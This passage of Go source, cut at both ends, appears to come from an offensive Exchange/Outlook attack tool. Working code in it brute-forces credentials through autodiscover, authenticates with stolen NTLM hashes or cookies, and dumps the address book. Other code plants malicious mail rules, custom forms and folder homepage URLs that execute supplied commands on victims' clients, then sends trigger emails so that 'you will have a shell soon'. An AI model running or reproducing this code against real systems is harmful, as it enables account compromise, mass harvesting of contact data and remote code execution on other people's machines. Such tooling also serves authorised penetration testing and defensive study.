https://login.microsoftonline.com/<domain>/.well-known/openid-configuration\n\t\t//response with 400 for none-hosted domains\n\t\t//response with 200 for office365 domains\n\n\t\tresp, _ := http.Get(fmt.Sprintf(\"https://login.microsoftonline.com/%s/.well-known/openid-configuration\", config.Domain))\n\t\tif resp.StatusCode == 400 {\n\t\t\tutils.Info.Println(\"Domain is not hosted on Office 365\")\n\t\t} else if resp.StatusCode == 200 {\n\t\t\tutils.Info.Println(\"Domain is hosted on Office 365\")\n\t\t} else {\n\t\t\tutils.Error.Println(\"Received an unexpected response\")\n\t\t\tutils.Debug.Println(resp.StatusCode)\n\t\t}\n\t}\n\n\treturn nil\n}\n\n// function to perform a bruteforce\nfunc brute(c *cli.Context) error {\n\tif c.String(\"users\") == \"\" && c.String(\"userpass\") == \"\" {\n\t\treturn fmt.Errorf(\"Either --users or --userpass required\")\n\t}\n\tif c.String(\"passwords\") == \"\" && c.String(\"userpass\") == \"\" {\n\t\treturn fmt.Errorf(\"Either --passwords or --userpass required\")\n\n\t}\n\tif c.GlobalString(\"domain\") == \"\" && c.GlobalString(\"url\") == \"\" && c.GlobalBool(\"o365\") == false {\n\t\treturn fmt.Errorf(\"Either --domain or --url required\")\n\t}\n\n\tutils.Info.Println(\"Starting bruteforce\")\n\tdomain := c.GlobalString(\"domain\")\n\tif c.GlobalString(\"url\") != \"\" {\n\t\tdomain = c.GlobalString(\"url\")\n\t}\n\tif c.GlobalBool(\"o365\") == true {\n\t\tdomain = \"https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml\"\n\t}\n\tif e := autodiscover.Init(domain, c.String(\"users\"), c.String(\"passwords\"), c.String(\"userpass\"), c.GlobalString(\"proxy\"), c.GlobalString(\"useragent\"), c.GlobalString(\"hostname\"), c.GlobalBool(\"basic\"), c.GlobalBool(\"insecure\"), c.Bool(\"stop\"), c.Bool(\"verbose\"), c.Int(\"attempts\"), c.Int(\"delay\"), c.Int(\"threads\")); e != nil {\n\t\treturn e\n\t}\n\n\tif c.String(\"userpass\") == \"\" {\n\t\tautodiscover.BruteForce()\n\t} else {\n\t\tautodiscover.UserPassBruteForce()\n\t}\n\n\treturn nil\n}\n\n// Function to add new rule\nfunc addRule(c *cli.Context) error {\n\tutils.Info.Println(\"Adding Rule\")\n\n\tres, err := mapi.ExecuteMailRuleAdd(c.String(\"name\"), c.String(\"trigger\"), c.String(\"location\"), true)\n\tif err != nil || res.StatusCode == 255 {\n\t\treturn fmt.Errorf(\"Failed to create rule. %s\", err)\n\t}\n\n\tutils.Info.Println(\"Rule Added. Fetching list of rules...\")\n\tprintRules()\n\n\tif c.Bool(\"send\") {\n\t\tutils.Info.Println(\"Auto Send enabled, wait 30 seconds before sending email (synchronisation)\")\n\t\t//initate a ping sequence, just incase we are on RPC/HTTP\n\t\t//we need to keep the socket open\n\t\tgo mapi.Ping()\n\t\ttime.Sleep(time.Second * (time.Duration)(30))\n\t\tutils.Info.Println(\"Sending email\")\n\t\tif c.String(\"subject\") == \"\" {\n\t\t\tsendMessage(c.String(\"trigger\"), c.String(\"body\"))\n\t\t} else {\n\t\t\tsendMessage(c.String(\"subject\"), c.String(\"body\"))\n\t\t}\n\n\t}\n\n\treturn nil\n}\n\n// Function to delete a rule\nfunc deleteRule(c *cli.Context) error {\n\tvar ruleid []byte\n\tvar err error\n\n\tif c.String(\"id\") == \"\" && c.String(\"name\") != \"\" {\n\t\trules, er := mapi.DisplayRules()\n\t\tif er != nil {\n\t\t\treturn er\n\t\t}\n\t\tutils.Info.Printf(\"Found %d rules. Extracting ids\\n\", len(rules))\n\t\tfor _, v := range rules {\n\t\t\tif utils.FromUnicode(v.RuleName) == c.String(\"name\") {\n\t\t\t\treader := bufio.NewReader(os.Stdin)\n\t\t\t\tutils.Question.Printf(\"Delete rule with id %x [y/N]: \", v.RuleID)\n\t\t\t\tans, _ := reader.ReadString('\\n')\n\t\t\t\tif ans == \"y\\n\" || ans == \"Y\\n\" || ans == \"yes\\n\" {\n\t\t\t\t\truleid = v.RuleID\n\t\t\t\t\terr = mapi.ExecuteMailRuleDelete(ruleid)\n\t\t\t\t\tif err != nil {\n\t\t\t\t\t\tutils.Error.Println(\"Failed to delete rule\")\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ruleid == nil {\n\t\t\treturn fmt.Errorf(\"No rule with supplied name found\")\n\t\t}\n\t} else {\n\t\truleid, err = hex.DecodeString(c.String(\"id\"))\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"Incorrect ruleid format. Try --name if you wish to supply a rule's name rather than id\")\n\t\t}\n\t\terr = mapi.ExecuteMailRuleDelete(ruleid)\n\t\tif err != nil {\n\t\t\tutils.Error.Println(\"Failed to delete rule\")\n\t\t}\n\t}\n\n\tif err == nil {\n\t\tutils.Info.Println(\"Fetching list of remaining rules...\")\n\t\ter := printRules()\n\t\tif er != nil {\n\t\t\treturn er\n\t\t}\n\t}\n\treturn err\n}\n\n// Function to display all rules\nfunc displayRules(c *cli.Context) error {\n\tutils.Info.Println(\"Retrieving Rules\")\n\ter := printRules()\n\n\treturn er\n}\n\n// sendMessage sends a message to the user, using their own Account\n// uses supplied subject and body\nfunc sendMessage(subject, body string) error {\n\tpropertyTags := make([]mapi.PropertyTag, 1)\n\tpropertyTags[0] = mapi.PidTagDisplayName\n\n\t_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)\n\tif er != nil {\n\t\treturn er\n\t}\n\t_, er = mapi.SendMessage(subject, body)\n\tif er != nil {\n\t\treturn er\n\t}\n\tutils.Info.Println(\"Message sent, your shell should trigger shortly.\")\n\n\treturn nil\n}\n\n// Function to connect to the Exchange server\nfunc connect(c *cli.Context) error {\n\tvar err error\n\n\t//if no password or hash was supplied, read from stdin\n\tif c.GlobalString(\"password\") == \"\" && c.GlobalString(\"hash\") == \"\" && c.GlobalString(\"config\") == \"\" {\n\t\tfmt.Printf(\"Password: \")\n\t\tvar pass []byte\n\t\tpass, err = gopass.GetPasswd()\n\t\tif err != nil {\n\t\t\t// Handle gopass.ErrInterrupted or getch() read error\n\t\t\treturn fmt.Errorf(\"Password or hash required. Supply NTLM hash with --hash\")\n\t\t}\n\t\tconfig.Pass = string(pass)\n\t} else {\n\t\tconfig.Pass = c.GlobalString(\"password\")\n\t\tif config.NTHash, err = hex.DecodeString(c.GlobalString(\"hash\")); err != nil {\n\t\t\treturn fmt.Errorf(\"Invalid hash provided. Hex decode failed\")\n\t\t}\n\t}\n\n\t//setup our autodiscover service\n\tconfig.Domain = c.GlobalString(\"domain\")\n\tconfig.User = c.GlobalString(\"username\")\n\tconfig.Email = c.GlobalString(\"email\")\n\tconfig.Basic = c.GlobalBool(\"basic\")\n\tconfig.Insecure = c.GlobalBool(\"insecure\")\n\tconfig.Verbose = c.GlobalBool(\"verbose\")\n\tconfig.Admin = c.GlobalBool(\"admin\")\n\tconfig.RPCEncrypt = !c.GlobalBool(\"noencrypt\")\n\tconfig.CookieJar, _ = cookiejar.New(nil)\n\tconfig.Proxy = c.GlobalString(\"proxy\")\n\tconfig.UserAgent = c.GlobalString(\"useragent\")\n\n\tconfig.Hostname = c.GlobalString(\"hostname\")\n\tif config.Hostname == \"\" {\n\t\thostname, err := os.Hostname()\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"An error is occurred while getting Hostname value. Try to specify it manually using --hostname\")\n\t\t}\n\t\tconfig.Hostname = hostname\n\t}\n\n\t//add supplied cookie to the cookie jar\n\tif c.GlobalString(\"cookie\") != \"\" {\n\t\t//split into cookies and then into name : value\n\t\tcookies := strings.Split(c.GlobalString(\"cookie\"), \";\")\n\t\tvar cookieJarTmp []*http.Cookie\n\t\tvar cdomain string\n\t\t//split and get the domain from the email\n\t\tif eparts := strings.Split(c.GlobalString(\"email\"), \"@\"); len(eparts) == 2 {\n\t\t\tcdomain = eparts[1]\n\t\t} else {\n\t\t\treturn fmt.Errorf(\"[x] Invalid email address\")\n\t\t}\n\n\t\tfor _, v := range cookies {\n\t\t\tcookie := strings.Split(v, \"=\")\n\t\t\tc := &http.Cookie{\n\t\t\t\tName:   cookie[0],\n\t\t\t\tValue:  cookie[1],\n\t\t\t\tPath:   \"/\",\n\t\t\t\tDomain: cdomain,\n\t\t\t}\n\t\t\tcookieJarTmp = append(cookieJarTmp, c)\n\t\t}\n\t\tu, _ := url.Parse(fmt.Sprintf(\"https://%s/\", cdomain))\n\t\tconfig.CookieJar.SetCookies(u, cookieJarTmp)\n\t}\n\n\tconfig.CookieJar, _ = cookiejar.New(nil)\n\n\turl := c.GlobalString(\"url\")\n\n\tif c.GlobalBool(\"o365\") == true {\n\t\turl = \"https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml\"\n\t}\n\n\tautodiscover.SessionConfig = &config\n\n\t//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable\n\t//unless of course the global \"RPC\" flag has been set, which specifies we should just use\n\t//RPC/HTTP from the get-go\n\tvar resp *utils.AutodiscoverResp\n\tvar rawAutodiscover string\n\tvar mapiURL, abkURL, userDN string\n\n\tif c.GlobalString(\"config\") != \"\" {\n\t\tvar yamlConfig utils.YamlConfig\n\t\tif yamlConfig, err = utils.ReadYml(c.GlobalString(\"config\")); err != nil {\n\t\t\tutils.Error.Println(\"Invalid Config file.\")\n\t\t\treturn err\n\t\t}\n\n\t\t//set all fields from yamlConfig into config (this overrides cmdline options)\n\t\tif yamlConfig.Username != \"\" {\n\t\t\tconfig.User = yamlConfig.Username\n\t\t}\n\t\tif yamlConfig.Password != \"\" {\n\t\t\tconfig.Pass = yamlConfig.Password\n\t\t}\n\t\tif yamlConfig.Email != \"\" {\n\t\t\tconfig.Email = yamlConfig.Email\n\t\t}\n\t\tif yamlConfig.Hash != \"\" {\n\t\t\tif config.NTHash, err = hex.DecodeString(yamlConfig.Hash); err != nil {\n\t\t\t\treturn fmt.Errorf(\"Invalid hash provided. Hex decode failed\")\n\t\t\t}\n\t\t}\n\n\t\tif config.User == \"\" && config.Email == \"\" {\n\t\t\treturn fmt.Errorf(\"Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config\")\n\t\t}\n\n\t\tif config.Pass == \"\" {\n\t\t\tfmt.Printf(\"Password: \")\n\t\t\tvar pass []byte\n\t\t\tpass, err = gopass.GetPasswd()\n\t\t\tif err != nil {\n\t\t\t\t// Handle gopass.ErrInterrupted or getch() read error\n\t\t\t\treturn fmt.Errorf(\"Password or hash required. Supply NTLM hash with --hash\")\n\t\t\t}\n\t\t\tconfig.Pass = string(pass)\n\t\t}\n\n\t\tif yamlConfig.RPC == true {\n\t\t\t//create RPC URL\n\t\t\tconfig.RPCURL = fmt.Sprintf(\"%s?%s:6001\", yamlConfig.RPCURL, yamlConfig.Mailbox)\n\t\t\tconfig.RPCEncrypt = yamlConfig.RPCEncrypt\n\t\t\tconfig.RPCNtlm = yamlConfig.Ntlm\n\t\t} else {\n\t\t\tmapiURL = fmt.Sprintf(\"%s?MailboxId=%s\", yamlConfig.MapiURL, yamlConfig.Mailbox)\n\t\t}\n\n\t\tuserDN = yamlConfig.UserDN\n\t} else if !c.GlobalBool(\"rpc\") {\n\t\tif config.User == \"\" && config.Email == \"\" {\n\t\t\treturn fmt.Errorf(\"Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config\")\n\t\t}\n\n\t\tif c.GlobalBool(\"nocache\") == false { //unless user specified nocache, check cache for existing autodiscover\n\t\t\tresp = autodiscover.CheckCache(config.Email)\n\t\t}\n\t\tif resp == nil {\n\t\t\tresp, rawAutodiscover, err = autodiscover.GetMapiHTTP(config.Email, url, resp)\n\t\t\tif err != nil {\n\t\t\t\texit(err)\n\t\t\t}\n\t\t}\n\n\t\tmapiURL = mapi.ExtractMapiURL(resp)\n\t\tabkURL = mapi.ExtractMapiAddressBookURL(resp)\n\t\tuserDN = resp.Response.User.LegacyDN\n\n\t\tif mapiURL == \"\" { //try RPC\n\t\t\tif rawAutodiscover != \"\" {\n\t\t\t\tresp, _, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)\n\t\t\t} else {\n\t\t\t\tresp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\texit(err)\n\t\t\t}\n\t\t\tif resp.Response.User.LegacyDN == \"\" {\n\t\t\t\treturn fmt.Errorf(\"Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \\n%s\", resp.Response.Error)\n\t\t\t}\n\n\t\t\tif c.GlobalBool(\"nocache\") == false {\n\t\t\t\tautodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use\n\t\t\t}\n\t\t} else {\n\t\t\tutils.Trace.Println(\"MAPI URL found: \", mapiURL)\n\t\t\tutils.Trace.Println(\"MAPI AddressBook URL found: \", abkURL)\n\n\t\t\t//mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)\n\t\t\tif c.GlobalBool(\"nocache\") == false {\n\t\t\t\tautodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use\n\t\t\t}\n\t\t}\n\t} else {\n\t\tif config.User == \"\" && config.Email == \"\" {\n\t\t\treturn fmt.Errorf(\"Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config\")\n\t\t}\n\n\t\tutils.Trace.Println(\"RPC/HTTP forced, trying RPC/HTTP\")\n\t\tif c.GlobalBool(\"nocache\") == false { //unless user specified nocache, check cache for existing autodiscover\n\t\t\tresp = autodiscover.CheckCache(config.Email)\n\t\t}\n\n\t\tresp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)\n\t\tif err != nil {\n\t\t\texit(err)\n\t\t}\n\n\t\tuserDN = resp.Response.User.LegacyDN\n\n\t\tif c.GlobalBool(\"nocache\") == false {\n\t\t\tautodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use\n\t\t}\n\t}\n\n\tif config.RPCURL != \"\" {\n\t\tmapi.Init(&config, userDN, \"\", \"\", mapi.RPC)\n\t} else {\n\t\tmapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)\n\t}\n\n\t//now we should do the login\n\tlogon, err := mapi.Authenticate()\n\n\tif err != nil {\n\t\texit(err)\n\t} else if logon.MailboxGUID != nil {\n\n\t\tutils.Trace.Println(\"And we are authenticated\")\n\t\tutils.Trace.Println(\"Openning the Inbox\")\n\n\t\tpropertyTags := make([]mapi.PropertyTag, 2)\n\t\tpropertyTags[0] = mapi.PidTagDisplayName\n\t\tpropertyTags[1] = mapi.PidTagSubfolders\n\t\tmapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox\n\t}\n\n\treturn nil\n}\n\nfunc printRules() error {\n\t//rules, er := mapi.DisplayRules()\n\tcols := make([]mapi.PropertyTag, 2)\n\tcols[0] = mapi.PidTagRuleName\n\tcols[1] = mapi.PidTagRuleID\n\t//cols[2] = mapi.PidTagRuleActions\n\n\trows, er := mapi.FetchRules(cols)\n\tif er != nil {\n\t\treturn er\n\t}\n\n\tif rows.RowCount > 0 {\n\t\tutils.Info.Printf(\"Found %d rules\\n\", rows.RowCount)\n\t\tmaxwidth := 30\n\n\t\tfor k := 0; k < int(rows.RowCount); k++ {\n\t\t\tif len(string(rows.RowData[k][0].ValueArray)) > maxwidth {\n\t\t\t\tmaxwidth = len(string(rows.RowData[k][0].ValueArray))\n\t\t\t}\n\t\t}\n\t\tmaxwidth -= 10\n\t\tfmstr1 := fmt.Sprintf(\"%%-%ds | %%-16s \\n\", maxwidth)\n\t\tfmstr2 := fmt.Sprintf(\"%%-%ds | %%x \\n\", maxwidth)\n\t\tutils.Info.Printf(fmstr1, \"Rule Name\", \"Rule ID\")\n\t\tutils.Info.Printf(\"%s|%s\\n\", (strings.Repeat(\"-\", maxwidth+1)), strings.Repeat(\"-\", 18))\n\t\tfor k := 0; k < int(rows.RowCount); k++ {\n\t\t\tclientSide := false\n\t\t\tclientApp := \"\"\n\t\t\t/*\n\t\t\t\trd := mapi.RuleAction{}\n\t\t\t\trd.Unmarshal(rows.RowData[k][2].ValueArray)\n\t\t\t\tif rd.ActionType == 0x05 {\n\t\t\t\t\tfor _, a := range rd.ActionData.Conditions {\n\t\t\t\t\t\tif a.Tag[1] == 0x49 {\n\t\t\t\t\t\t\tclientSide = true\n\t\t\t\t\t\t\tclientApp = string(utils.FromUnicode(a.Value))\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t*/\n\t\t\tif clientSide == true {\n\t\t\t\tutils.Info.Printf(fmstr2, string(utils.FromUnicode(rows.RowData[k][0].ValueArray)), rows.RowData[k][1].ValueArray, fmt.Sprintf(\"* %s\", clientApp))\n\t\t\t} else {\n\t\t\t\tutils.Info.Printf(fmstr2, string(utils.FromUnicode(rows.RowData[k][0].ValueArray)), rows.RowData[k][1].ValueArray)\n\t\t\t}\n\t\t}\n\t\tutils.Info.Println()\n\t} else {\n\t\tutils.Info.Println(\"No Rules Found\")\n\t}\n\n\treturn nil\n}\n\n// Function to display all addressbook entries\nfunc abkList(c *cli.Context) error {\n\tutils.Trace.Println(\"Let's play addressbook\")\n\tif config.Transport == mapi.RPC {\n\t\treturn fmt.Errorf(\"Only MAPI/HTTP is currently supported for addressbook interaction\")\n\t}\n\n\tmapi.BindAddressBook()\n\n\tcolumns := make([]mapi.PropertyTag, 2)\n\tcolumns[0] = mapi.PidTagDisplayName\n\tcolumns[1] = mapi.PidTagSMTPAddress\n\trows, _ := mapi.QueryRows(100, []byte{}, columns) //pull first 255 entries\n\tutils.Info.Println(\"Found the following entries: \")\n\tmaxwidth := 30\n\tfmstr1 := fmt.Sprintf(\"%%-%ds | %%-s\\n\", maxwidth)\n\tfmstr2 := fmt.Sprintf(\"%%-%ds | %%s\\n\", maxwidth)\n\tutils.Info.Printf(fmstr1, \"Display Name\", \"SMTP Address\")\n\tutils.Info.Printf(\"%s|%s\\n\", (strings.Repeat(\"-\", maxwidth+1)), strings.Repeat(\"-\", 18))\n\tfor k := 0; k < int(rows.RowCount); k++ {\n\t\tif len(rows.RowData[k].AddressBookPropertyValue) == 2 {\n\t\t\tdisp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)\n\t\t\tif len(disp) > maxwidth {\n\t\t\t\tdisp = disp[:maxwidth-2]\n\t\t\t}\n\t\t\tutils.Clear.Printf(fmstr2, string(disp), rows.RowData[k].AddressBookPropertyValue[1].Value)\n\t\t}\n\t}\n\tstate := mapi.STAT{}\n\tstate.Unmarshal(rows.State)\n\ttotalrows := state.TotalRecs\n\tfor i := 0; i < int(totalrows); i += 100 {\n\t\trows, _ = mapi.QueryRows(100, rows.State, columns)\n\t\tfor k := 0; k < int(rows.RowCount); k++ {\n\t\t\tif len(rows.RowData[k].AddressBookPropertyValue) == 2 {\n\t\t\t\tdisp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)\n\t\t\t\tif len(disp) > maxwidth {\n\t\t\t\t\tdisp = disp[:maxwidth-2]\n\t\t\t\t}\n\t\t\t\tutils.Clear.Printf(fmstr2, string(disp), rows.RowData[k].AddressBookPropertyValue[1].Value)\n\t\t\t}\n\t\t}\n\t}\n\n\treturn nil\n}\n\n// Function to display all addressbook entries\nfunc abkDump(c *cli.Context) error {\n\tif config.Transport == mapi.RPC {\n\t\treturn fmt.Errorf(\"Address book support is currently limited to MAPI/HTTP\")\n\t}\n\tutils.Trace.Println(\"Let's Dump the addressbook\")\n\tfout, err := os.OpenFile(c.String(\"output\"), os.O_CREATE|os.O_WRONLY, 0666)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Couldn't create file to write to... %s\", err)\n\t}\n\n\tmapi.BindAddressBook()\n\tcolumns := make([]mapi.PropertyTag, 2)\n\tcolumns[0] = mapi.PidTagDisplayName\n\tcolumns[1] = mapi.PidTagSMTPAddress\n\trows, _ := mapi.QueryRows(100, []byte{}, columns) //pull first 255 entries\n\n\tfor k := 0; k < int(rows.RowCount); k++ {\n\t\tif len(rows.RowData[k].AddressBookPropertyValue) == 2 {\n\t\t\tdisp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)\n\t\t\temail := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[1].Value)\n\t\t\tif _, err := fout.WriteString(fmt.Sprintf(\"%s , %s\\n\", disp, email)); err != nil {\n\t\t\t\treturn fmt.Errorf(\"Couldn't write to file... %s\", err)\n\t\t\t}\n\t\t}\n\t}\n\tstate := mapi.STAT{}\n\tstate.Unmarshal(rows.State)\n\ttotalrows := state.TotalRecs\n\tutils.Info.Printf(\"Found %d entries in the GAL. Dumping...\", totalrows)\n\tfor i := 0; i < int(totalrows); i += 100 {\n\t\trows, _ = mapi.QueryRows(100, rows.State, columns)\n\t\tutils.Info.Printf(\"Dumping %d/%d\", i+100, totalrows)\n\t\tfor k := 0; k < int(rows.RowCount); k++ {\n\t\t\tif len(rows.RowData[k].AddressBookPropertyValue) == 2 {\n\t\t\t\tdisp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)\n\t\t\t\temail := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[1].Value)\n\t\t\t\tif _, err := fout.WriteString(fmt.Sprintf(\"%s | %s\\n\", disp, email)); err != nil {\n\t\t\t\t\treturn fmt.Errorf(\"Couldn't write to file... %s\", err)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn nil\n}\n\nfunc createForm(c *cli.Context) error {\n\t//first check that supplied command is valid\n\tvar command string\n\tif c.String(\"input\") != \"\" {\n\t\tcmd, err := utils.ReadFile(c.String(\"input\"))\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tcommand = string(cmd)\n\t} else {\n\t\tcommand = c.String(\"command\")\n\t}\n\n\tif len(command) > 4096 {\n\t\treturn fmt.Errorf(\"Command is too large. Maximum command size is 4096 characters.\")\n\t}\n\n\tsuffix := c.String(\"suffix\")\n\tfolderid := mapi.AuthSession.Folderids[mapi.INBOX]\n\n\tutils.Trace.Println(\"Verifying that form does not exist.\")\n\t//check that form does not already exist\n\tif err := forms.CheckForm(folderid, suffix); err != nil {\n\t\treturn err\n\t}\n\tvar rname, triggerword string\n\tif c.Bool(\"rule\") == true {\n\t\trname = utils.GenerateString(6)\n\t\ttriggerword = utils.GenerateString(8)\n\t} else {\n\t\trname = \"NORULE\"\n\t}\n\n\tmsgid, err := forms.CreateFormMessage(suffix, rname)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tif err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {\n\t\treturn err\n\t}\n\tif c.Bool(\"raw\") == true {\n\t\tif err := forms.CreateFormAttachmentForDeleteTemplate(folderid, msgid, command); err != nil {\n\t\t\treturn err\n\t\t}\n\t} else {\n\t\tif err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\tutils.Info.Println(\"Form created successfully\")\n\n\tif c.Bool(\"rule\") == true {\n\t\tutils.Info.Printf(\"Rule trigger set. Adding new rule with name %s\\n\", rname)\n\t\tutils.Info.Printf(\"Adding new rule with trigger of %s\\n\", triggerword)\n\n\t\t//create delete rule\n\t\tif _, err := mapi.ExecuteDeleteRuleAdd(rname, triggerword); err != nil {\n\t\t\tutils.Error.Println(\"Failed to create the trigger rule\")\n\t\t} else {\n\t\t\tutils.Info.Println(\"Trigger rule created.\")\n\t\t}\n\n\t\tif c.Bool(\"send\") == false {\n\t\t\tutils.Info.Printf(\"Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \\\"%s\\\" present in the subject. \\n\", triggerword)\n\t\t}\n\t\tc.Set(\"subject\", triggerword)\n\t}\n\n\t//trigger the email if the send option is enabled\n\tif c.Bool(\"send\") == true {\n\t\treturn triggerForm(c)\n\t}\n\treturn nil\n}\n\nfunc triggerForm(c *cli.Context) error {\n\tsubject := c.String(\"subject\")\n\tbody := c.String(\"body\")\n\tsuffix := c.String(\"suffix\")\n\tfolderid := mapi.AuthSession.Folderids[mapi.INBOX]\n\ttarget := mapi.AuthSession.Email\n\n\tutils.Trace.Println(\"Creating Trigger message.\")\n\tmsgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)\n\tif err != nil {\n\t\treturn err\n\t}\n\tutils.Info.Println(\"Sending email.\")\n\t//send to another account\n\tif c.String(\"target\") != \"\" {\n\t\ttarget = c.String(\"target\")\n\t}\n\n\tif _, err = mapi.SendExistingMessage(folderid, msgid, target); err != nil {\n\t\treturn err\n\t}\n\tutils.Info.Println(\"Email sent! Hopefully you will have a shell soon.\")\n\n\treturn nil\n}\n\nfunc deleteForm(c *cli.Context) error {\n\tsuffix := c.String(\"suffix\")\n\tfolderid := mapi.AuthSession.Folderids[mapi.INBOX]\n\n\tif _, err := forms.DeleteForm(suffix, folderid); err != nil {\n\t\tutils.Error.Println(\"Failed to delete form.\")\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc displayForms(c *cli.Context) error {\n\tfolderid := mapi.AuthSession.Folderids[mapi.INBOX]\n\n\tif err := forms.DisplayForms(folderid); err != nil {\n\t\tutils.Error.Println(\"Failed to find any forms.\")\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc createHomePage(c *cli.Context) error {\n\tutils.Info.Println(\"Creating new endpoint\")\n\twvpObjectStream := mapi.WebViewPersistenceObjectStream{Version: 2, Type: 1, Flags: 1}\n\twvpObjectStream.Reserved = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}\n\twvpObjectStream.Value = utils.UniString(c.String(\"url\"))\n\twvpObjectStream.Size = uint32(len(wvpObjectStream.Value))\n\tprop := wvpObjectStream.Marshal()\n\tfolderid := mapi.AuthSession.Folderids[mapi.INBOX]\n\tpropertyTags := make([]mapi.TaggedPropertyValue, 1)\n\tpropertyTags[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagFolderWebViewInfo, PropertyValue: append(utils.COUNT(len(prop)), prop...)}\n\n\tif _, e := mapi.SetFolderProperties(folderid, propertyTags); e != nil {\n\t\treturn e\n\t}\n\tutils.Info.Println(\"Verifying...\")\n\tprops := make([]mapi.PropertyTag, 1)\n\tprops[0] = mapi.PidTagFolderWebViewInfo\n\t_, _, e := mapi.GetFolderProps(mapi.INBOX, props)\n\tif e != nil {\n\t\tutils.Warning.Println(\"New endpoint not set\")\n\t\treturn e\n\t}\n\tutils.Info.Println(\"New endpoint set\")\n\tutils.Info.Println(\"Trying to force trigger\")\n\tmapi.CreateFolder(\"xyz\", true)\n\n\treturn nil\n}\n\nfunc displayHomePage() error {\n\tutils.Info.Println(\"Getting existing endpoint\")\n\tprops := make([]mapi.PropertyTag, 1)\n\tprops[0] = mapi.PidTagFolderWebViewInfo\n\t_, c, e := mapi.GetFolderProps(mapi.INBOX, props)\n\tif e == nil {\n\t\twvp := mapi.WebViewPersistenceObjectStream{}\n\t\twvp.Unmarshal(c.RowData[0].ValueArray)\n\n\t\tif utils.FromUnicode(wvp.Value) == \"\" {\n\t\t\tutils.Info.Println(\"No endpoint set\")\n\t\t\treturn nil\n\t\t}\n\n\t\tutils.Info.Printf(\"Found endpoint: %s\\n\", utils.FromUnicode(wvp.Value))\n\n\t\tif wvp.Flags == 0 {\n\t\t\tutils.Info.Println(\"Webview is set as DISABLED\")\n\t\t} else {\n\t\t\tutils.Info.Println(\"Webview is set as ENABLED\")\n\t\t}\n\t}\n\n\treturn e\n}\n\nfunc deleteHomePage() error {\n\tutils.Info.Println(\"Unsetting homepage. Remember to use 'add' if you want to reset this to the original value\")\n\twvpObjectStream := mapi.WebViewPersistenceObjectStream{Version: 2, Type: 1, Flags: 0}\n\twvpObjectStream.Reserved = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}\n\twvpObjectStream.Value = utils.UniString(\"\")\n\twvpObjectStream.Size = uint32(len(wvpObjectStream.Value))\n\tprop := wvpObjectStream.Marshal()\n\tfolderid := mapi.AuthSession.Folderids[mapi.INBOX]\n\tpropertyTags := make([]mapi.TaggedPropertyValue, 1)\n\tpropertyTags[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagFolderWebViewInfo, PropertyValue: append(utils.COUNT(len(prop)), prop...)}\n\n\tif _, e := mapi.SetFolderProperties(folderid, propertyTags); e != nil {\n\t\treturn e\n\t}\n\tutils.Info.Println(\"Verifying...\")\n\tprops := make([]mapi.PropertyTag, 1)\n\tprops[0] = mapi.PidTagFolderWebViewInfo\n\t_, _, e := mapi.GetFolderProps(mapi.INBOX, props)\n\tif e == nil {\n\t\tutils.Info.Println(\"Webview reset\")\n\t}\n\n\tutils.Info.Println(\"Cleaning up and removing trigger\")\n\n\trows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])\n\tvar FolderID []byte\n\tif er == nil {\n\t\tfor k := 0; k < len(rows.RowData); k++ {\n\t\t\t//utils.Info.Println(fromUnicode(rows.RowData[k][0].ValueArray))\n\t\t\t//convert string from unicode and then check if it is our target folder\n\t\t\tif 